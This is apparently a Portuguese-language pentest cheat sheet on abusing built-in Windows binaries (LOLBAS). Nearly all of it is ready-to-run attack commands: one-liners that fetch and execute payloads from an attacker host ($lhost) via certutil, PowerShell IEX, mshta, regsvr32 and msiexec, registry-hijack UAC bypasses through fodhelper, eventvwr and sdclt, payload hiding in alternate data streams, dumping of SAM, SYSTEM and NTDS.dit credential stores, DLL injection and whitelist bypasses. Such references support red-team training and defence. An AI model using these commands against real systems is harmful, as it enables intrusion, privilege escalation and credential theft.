# LOLBAS - Living Off The Land no Windows

## Índice

- [Visão Geral](#visão-geral)
- [Download e Transferência de Arquivos](#download-e-transferência-de-arquivos)
- [Execução de Comandos](#execução-de-comandos)
- [Bypass de UAC](#bypass-de-uac)
- [Alternate Data Streams](#alternate-data-streams)
- [Dump de Credenciais](#dump-de-credenciais)
- [Execução de DLL](#execução-de-dll)
- [Bypass de Whitelist de Aplicações](#bypass-de-whitelist-de-aplicações)

---

## Visão Geral

LOLBAS (Living Off The Land Binaries, Scripts and Libraries) são binários legítimos do Windows que podem ser usados para fins maliciosos.

**Referência completa:** <https://lolbas-project.github.io/>

**Categorias:**

- **Binários** — Executáveis nativos do Windows
- **Scripts** — Scripts WSH, VBS, PS1
- **Bibliotecas** — DLLs que podem ser abusadas

---

## Download e Transferência de Arquivos

### Verificação Rápida (One-liner)

```cmd
:: Download rápido com certutil
certutil -urlcache -split -f http://%lhost%/%file% %TEMP%\%file% && %TEMP%\%file%
```

### certutil

> Baixar arquivo

```cmd
certutil -urlcache -split -f http://$lhost/$file $file
```

> Baixar e decodificar Base64

```cmd
certutil -urlcache -split -f http://$lhost/$file.b64 $file.b64
certutil -decode $file.b64 $file.exe
```

> Codificar arquivo em Base64

```cmd
certutil -encode $file.exe $file.b64
```

### bitsadmin

> Baixar arquivo (foreground)

```cmd
bitsadmin /transfer myJob /download /priority foreground http://$lhost/$file C:\Users\Public\$file
```

> Baixar arquivo (criar job)

```cmd
bitsadmin /create myJob
bitsadmin /addfile myJob http://$lhost/$file C:\Users\Public\$file
bitsadmin /resume myJob
bitsadmin /complete myJob
```

### PowerShell (iwr/wget)

> Baixar arquivo

```powershell
Invoke-WebRequest -Uri http://$lhost/$file -OutFile $file
iwr http://$lhost/$file -o $file
```

> Baixar e executar em memória

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://$lhost/$script.ps1')
IEX(IWR http://$lhost/$script.ps1 -UseBasicParsing)
```

### curl (Windows 10+)

> Baixar arquivo

```cmd
curl http://$lhost/$file -o $file
```

### wget (Windows 10+)

> Baixar arquivo

```cmd
wget http://$lhost/$file -O $file
```

### esentutl

> Copiar arquivo (alternativa ao copy)

```cmd
esentutl /y C:\Windows\System32\config\SAM /d C:\tmp\SAM /o
```

> Baixar arquivo (via WebDAV)

```cmd
esentutl /y \\$lhost\share\$file /d C:\tmp\$file /o
```

### expand

> Copiar arquivo de CAB

```cmd
expand \\$lhost\share\$file.cab C:\tmp\$file.exe
```

### findstr

> Baixar via SMB

```cmd
findstr /V "naoexiste" \\$lhost\share\$file > C:\tmp\$file
```

### MpCmdRun (Defender)

> Baixar arquivo

```cmd
MpCmdRun.exe -DownloadFile -url http://$lhost/$file -path C:\tmp\$file
```

### replace

> Copiar arquivo

```cmd
replace \\$lhost\share\$file C:\tmp /A
```

---

## Execução de Comandos

### mshta

> Executar HTA a partir de URL

```cmd
mshta http://$lhost/payload.hta
```

> Executar VBScript

```cmd
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")
```

> Executar JavaScript

```cmd
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("cmd.exe /c whoami");close();
```

### msiexec

> Executar MSI a partir de URL

```cmd
msiexec /q /i http://$lhost/payload.msi
```

> Executar DLL

```cmd
msiexec /y C:\caminho\para\payload.dll
```

### rundll32 (Execução)

> Executar função de DLL

```cmd
rundll32.exe C:\caminho\para\payload.dll,EntryPoint
```

> Executar JavaScript

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami");
```

> Executar a partir de URL via mshtml

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://$lhost/payload.sct");
```

### regsvr32 (Execução)

> Executar SCT a partir de URL

```cmd
regsvr32 /s /n /u /i:http://$lhost/payload.sct scrobj.dll
```

### cmstp

> Executar arquivo INF

```cmd
cmstp.exe /ni /s C:\caminho\para\payload.inf
```

### forfiles

> Executar comando

```cmd
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"
```

### pcalua

> Executar programa

```cmd
pcalua.exe -a calc.exe
pcalua.exe -a C:\caminho\para\payload.exe
```

### SyncAppvPublishingServer

> Executar PowerShell

```cmd
SyncAppvPublishingServer.exe "n; Start-Process cmd.exe"
```

### explorer

> Executar programa

```cmd
explorer.exe C:\caminho\para\payload.exe
```

---

## Bypass de UAC

### fodhelper

```powershell
# Definir chave de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\caminho\para\payload.exe" -Force

# Disparar
Start-Process fodhelper.exe -WindowStyle Hidden

# Limpeza
Remove-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Recurse -Force
```

### eventvwr

```powershell
# Definir chave de registro
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\caminho\para\payload.exe" -Force

# Disparar
Start-Process eventvwr.exe -WindowStyle Hidden
```

### computerdefaults

```powershell
# Definir chave de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\caminho\para\payload.exe" -Force

# Disparar
Start-Process computerdefaults.exe -WindowStyle Hidden
```

### sdclt

```powershell
# Definir chave de registro
New-Item "HKCU:\Software\Classes\Folder\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\caminho\para\payload.exe" -Force

# Disparar
Start-Process sdclt.exe -WindowStyle Hidden
```

---

## Alternate Data Streams

### Escrever em ADS

```cmd
echo "dado oculto" > arquivo.txt:oculto.txt
type payload.exe > arquivo.txt:payload.exe
```

### Ler de ADS

```cmd
more < arquivo.txt:oculto.txt
powershell Get-Content -Path arquivo.txt -Stream oculto.txt
```

### Executar a partir de ADS

```cmd
wmic process call create "C:\caminho\arquivo.txt:payload.exe"
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\caminho\arquivo.txt:payload.exe"
```

### Listar ADS

```cmd
dir /r
powershell Get-Item -Path arquivo.txt -Stream *
```

---

## Dump de Credenciais

### reg.exe

> Dump de SAM, SYSTEM, SECURITY

```cmd
reg save HKLM\SAM C:\tmp\SAM
reg save HKLM\SYSTEM C:\tmp\SYSTEM
reg save HKLM\SECURITY C:\tmp\SECURITY
```

### ntdsutil

> Dump de NTDS.dit (em Controlador de Domínio)

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\tmp" q q
```

### vssadmin

> Criar shadow copy e acessar NTDS

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\tmp\SYSTEM
```

### diskshadow

> Shadow copy via script

```cmd
# Criar script.txt:
# set context persistent nowriters
# add volume c: alias myalias
# create
# expose %myalias% z:
# exit

diskshadow /s script.txt
copy z:\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit
```

### wbadmin

> Backup de NTDS

```cmd
wbadmin start backup -backuptarget:E: -include:C:\Windows\NTDS
```

---

## Execução de DLL

### rundll32 (DLL)

> Executar DLL

```cmd
rundll32.exe payload.dll,EntryPoint
rundll32.exe shell32.dll,Control_RunDLL payload.dll
```

### regsvr32 (DLL)

> Registrar/executar DLL

```cmd
regsvr32 /s payload.dll
regsvr32 /s /n /u /i:http://$lhost/payload.sct scrobj.dll
```

### control

> Executar DLL via Painel de Controle

```cmd
control.exe payload.dll
```

### odbcconf

> Executar DLL

```cmd
odbcconf /a {regsvr payload.dll}
```

### InstallUtil (DLL)

> Executar DLL .NET

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### Mavinject

> Injetar DLL em processo

```cmd
mavinject.exe $PID /INJECTRUNNING C:\caminho\para\payload.dll
```

---

## Bypass de Whitelist de Aplicações

### MSBuild

> Executar código C#

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### InstallUtil (Bypass)

> Executar assembly .NET

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe
```

### Regasm

> Executar assembly .NET

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

### Regsvcs

> Executar assembly .NET

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe payload.dll
```

### CMSTP

> Executar via INF

```cmd
cmstp.exe /ni /s payload.inf
```

### Bash (WSL)

> Executar via WSL

```cmd
bash.exe -c "whoami"
wsl.exe whoami
```

---

## Referência Rápida

### Transferência de Arquivos

| Binário | Comando |
| :--- | :--- |
| certutil | `certutil -urlcache -split -f http://$lhost/$file $file` |
| bitsadmin | `bitsadmin /transfer job http://$lhost/$file $file` |
| PowerShell | `iwr http://$lhost/$file -o $file` |
| curl | `curl http://$lhost/$file -o $file` |

### Execução de Código

| Binário | Comando |
| :--- | :--- |
| mshta | `mshta http://$lhost/payload.hta` |
| msiexec | `msiexec /q /i http://$lhost/payload.msi` |
| rundll32 | `rundll32.exe payload.dll,Entry` |
| regsvr32 | `regsvr32 /s /n /u /i:http://$lhost/p.sct scrobj.dll` |

### Referência Rápida de Bypass UAC

| Binário | Técnica |
| :--- | :--- |
| fodhelper | HKCU:\Software\Classes\ms-settings\Shell\Open\command |
| eventvwr | HKCU:\Software\Classes\mscfile\Shell\Open\command |
| computerdefaults | HKCU:\Software\Classes\ms-settings\Shell\Open\command |
| sdclt | HKCU:\Software\Classes\Folder\Shell\Open\command |

### Caminhos Úteis

```cmd
# .NET Framework
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\

# System32
C:\Windows\System32\

# Diretórios temporários
C:\Users\Public\
C:\Windows\Temp\
%TEMP%
```

---

## 📚 Veja Também

### Escalação de Privilégios Relacionada

- **[Escalação de Privilégios Windows](Privilege-Escalation-Windows.md)** — Metodologia completa de privesc no Windows
- **[Potato Exploits](Potato-Exploits.md)** — Escalação de privilégios por impersonação de token
- **[Ferramentas PrivEsc Windows](Windows-PrivEsc-Tools.md)** — RunasCs, Seatbelt, SharpUp

### Tópicos Relacionados

- **[Comandos Windows](../6.OS-Command/6.1.Windows-command.md)** — Comandos de enumeração e sistema Windows
- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** — Reverse shells PowerShell e Windows
- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Movimentação pós-exploração
